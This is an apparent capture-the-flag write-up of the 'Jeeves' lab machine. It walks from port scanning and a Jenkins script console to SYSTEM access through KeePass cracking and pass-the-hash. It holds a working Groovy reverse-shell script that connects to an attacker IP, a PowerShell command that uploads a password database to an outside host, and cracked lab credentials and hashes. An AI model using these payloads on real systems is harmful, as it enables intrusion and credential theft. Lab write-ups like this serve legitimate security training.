# Jeeves - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed several open services:
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http          Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

Based on the scan results, I identified:
- Microsoft IIS web server running on port 80
- SMB services on port 445 
- A Jetty web server running on port 50000
- Hostname: JEEVES
- Operating System: Windows (likely Windows Server 2008 R2 or Windows 8.1)

### Web Enumeration
Looking at the web server on port 80, I found a basic "Ask Jeeves" themed search page that didn't reveal much functionality.

For the Jetty server on port 50000, I ran directory enumeration:
```bash
gobuster dir -u http://10.129.228.8:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This revealed an interesting directory:
```
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.8:50000/askjeeves/]
```

## Gaining Initial Access

### Jenkins Discovery
Following the `/askjeeves` redirection, I discovered a Jenkins automation server. Jenkins is a popular open-source automation server that is often misconfigured and can be leveraged for remote code execution.

Jenkins provides a script console feature that allows running Groovy scripts directly on the server. This is a powerful feature that, if accessible, can lead to remote code execution.

I navigated to the script console:
```
http://10.129.228.8:50000/askjeeves/script
```

From there, I was able to execute arbitrary Groovy code, which I leveraged for a reverse shell.

### Obtaining a Reverse Shell
I set up a netcat listener on my attack machine:
```bash
nc -lvnp 4444
```

Then I used the following Groovy script in the Jenkins script console to establish a reverse shell:
```groovy
String host="10.10.16.3";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

After executing the script, I received a reverse shell connection to my netcat listener, providing me initial access to the system.

## Privilege Escalation

### Credential Hunting
After gaining access to the system, I began searching for potential privilege escalation vectors. In the Documents folder, I discovered a KeePass password database file:
```
C:\Users\kohsuke\Documents\CEH.kdbx
```

I transferred this file to my attack machine using a simple Python HTTP server:
```bash
# On the target
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.16.3:8000/upload.php', 'C:\Users\kohsuke\Documents\CEH.kdbx')"

# On my attack machine
python3 -m http.server 8000
```

### KeePass Password Cracking
Once I had the KeePass database file, I needed to crack the master password:
```bash
keepass2john '/home/kali/Documents/PEN200/HTB/Jeeves/CEH.kdbx' > hash
john hash -w:'/usr/share/wordlists/rockyou.txt'
```

This revealed the master password: `moonshine1`

### Credential Analysis
Opening the KeePass database with the cracked password revealed stored credentials:
- Admin account password: `S1TjAtJHKsugh9oC4VZl`
- Hash for a backup account: `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

### Gaining Administrative Access
I first attempted to use the admin password directly with PsExec:
```bash
psexec.py Administrator@10.129.228.8 -p 'S1TjAtJHKsugh9oC4VZl'
```

This resulted in a login error. 

I then tried using the hash (pass-the-hash technique) with PsExec:
```bash
psexec.py Administrator@10.129.228.8 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

This was successful and provided me with a SYSTEM-level shell.

## Flag Extraction

Once logged in as Administrator, I navigated to the usual location for the root flag but encountered an unusual situation. The flag wasn't immediately visible in the Administrator's desktop.

After some exploration, I discovered that the flag was hidden in an Alternate Data Stream (ADS). Windows NTFS file systems support ADS, which allows files to contain more than one stream of data.

To list files with ADS, I used:
```cmd
dir /r /a
```

This revealed an alternate data stream named `root.txt` within a file called `hm.txt`.

To read the contents of this alternate data stream, I used:
```cmd
more < hm.txt:root.txt
```

This successfully displayed the root flag
